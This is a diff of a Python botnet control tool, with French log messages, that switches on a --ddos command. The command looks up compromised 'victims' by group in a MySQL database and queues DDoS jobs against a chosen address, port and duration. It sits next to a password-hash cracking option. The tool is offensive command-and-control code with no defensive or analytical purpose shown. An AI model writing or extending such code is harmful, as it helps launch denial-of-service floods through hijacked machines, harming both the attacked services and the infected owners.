@@ -129,40 +129,40 @@ db = mysql.connector.connect(
 mycursor = db.cursor()
 
 
-# if args.ddos:
-#     if not args.address or not args.time or not args.port:
-#         logger.error("--ddos nécessite les arguments --address, --time et --port")
-#         parser.error("--ddos nécessite les arguments --address, --time et --port")
+if args.ddos:
+    if not args.address or not args.time or not args.port:
+        logger.error("--ddos nécessite les arguments --address, --time et --port")
+        parser.error("--ddos nécessite les arguments --address, --time et --port")
 
-#     elif not args.host:
-#         logger.error("--ddos nécessite l'argument --host")
-#         parser.error("--ddos nécessite l'argument --host")
-#     elif args.host:
-#         try:
-#             for victim in args.host.split(","):
-#                 query = "SELECT id FROM victims WHERE uid = %s"
-#                 values = (victim, )
-#                 mycursor.execute(query, values)
+    elif not args.group:
+        logger.error("--ddos nécessite l'argument --group")
+        parser.error("--ddos nécessite l'argument --group")
 
-#                 result = mycursor.fetchall()
-#                 for id in result:
-#                     query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-#                     values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
-#                     mycursor.execute(query, values)
-#             logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", host:"+ args.host)
-#         except mysql.connector.ProgrammingError as e:
-#             logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
-#         except mysql.connector.Error as e:
-#             logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")
+    elif args.group:
+        group_name = args.group
+        # Récupération de l'id de chaque victim du groupe
+        query = "SELECT id FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+        values = (group_name, )
+        mycursor.execute(query, values)
+        result = mycursor.fetchall()
+        try:
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
+                mycursor.execute(query, values)
+            logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", group:"+ args.group)
+        except mysql.connector.ProgrammingError as e:
+            logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
+        except mysql.connector.Error as e:
+            logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")
 
-#     else:
-#         parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
-
-# arg 1 : ip # arg2 : port # arg3 : time  
+    else:
+        parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
+        
 ############################################################
 
 
-if args.crack:
+elif args.crack:
     if not args.hash or not args.wordlist:
         logger.error("--crack nécessite les arguments --hash et --wordlist")
         parser.error("--crack nécessite les arguments --hash et --wordlist")
